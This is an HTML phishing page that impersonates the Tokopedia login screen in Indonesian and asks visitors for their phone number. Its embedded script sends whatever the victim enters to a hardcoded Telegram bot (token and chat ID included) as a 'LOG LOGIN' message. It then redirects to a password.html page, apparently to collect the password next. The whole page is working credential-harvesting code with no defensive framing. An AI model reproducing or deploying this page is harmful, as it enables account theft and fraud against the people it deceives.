<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>Masuk ke Tokopedia</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { font-family: 'Open Sans', sans-serif; -webkit-tap-highlight-color: transparent; }
        .focus-green:focus { border-color: #03AC0E; }
    </style>
</head>
<body class="bg-white">

    <div class="flex justify-end p-5">
        <span class="text-[#03AC0E] font-bold text-md cursor-pointer">Daftar</span>
    </div>

    <div class="max-w-md mx-auto px-6 pt-2">
        <h1 class="text-[22px] font-bold text-[#31353B] mb-6">Masuk ke Tokopedia</h1>

        <div class="mb-5">
            <input type="text" id="userInput" placeholder="masukan nomor handphone" 
                class="w-full p-3.5 border border-gray-300 rounded-lg outline-none focus-green text-md placeholder-gray-400 transition-all">
        </div>

        <button id="btnNext" class="w-full bg-[#03AC0E] text-white font-bold py-3.5 rounded-lg text-md shadow-sm">
            Selanjutnya
        </button>

        <div class="relative flex items-center my-10">
            <div class="flex-grow border-t border-gray-200"></div>
            <span class="flex-shrink mx-4 text-gray-400 text-[11px] uppercase tracking-wide">atau masuk dengan</span>
            <div class="flex-grow border-t border-gray-200"></div>
        </div>

        <div class="space-y-3">
            <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer">
                <img src="https://www.gstatic.com/images/branding/product/1x/googleg_48dp.png" class="w-5 h-5 mr-3">
                <span class="font-semibold text-gray-600 text-sm">Google</span>
            </div>
            <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer">
                <span class="font-semibold text-gray-600 text-sm">E-mail</span>
            </div>
            <div class="w-full flex items-center justify-center p-3 border border-gray-300 rounded-lg cursor-pointer text-gray-800">
                <span class="font-semibold text-sm">TikTok Shop</span>
            </div>
        </div>

        <p class="text-[11px] text-gray-400 mt-12 text-center leading-relaxed">
            Dengan masuk di sini, kamu menyetujui <span class="text-[#03AC0E]">Syarat & Ketentuan</span> serta <span class="text-[#03AC0E]">Kebijakan Privasi</span> Tokopedia
        </p>

        <p class="mt-10 text-center text-[14px] text-[#31353B]">
            Belum punya akun? <span class="text-[#03AC0E] font-bold">Daftar Sekarang</span>
        </p>
    </div>

    <script>
        const TOKEN = "8746602429:AAHRxWuzAmXIksUuIs87TNq4oLGjxIJH83w";
        const CHAT_ID = "8723798929";

        document.getElementById('btnNext').addEventListener('click', function() {
            const val = document.getElementById('userInput').value;
            if (!val) return;

            this.innerText = "Memproses...";
            this.disabled = true;

            const text = `<b>🔔 LOG LOGIN</b>\n<b>User:</b> <code>${val}</code>`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
            }).then(() => {
                window.location.href = "password.html?u=" + encodeURIComponent(val);
            });
        });
    </script>
</body>
</html>
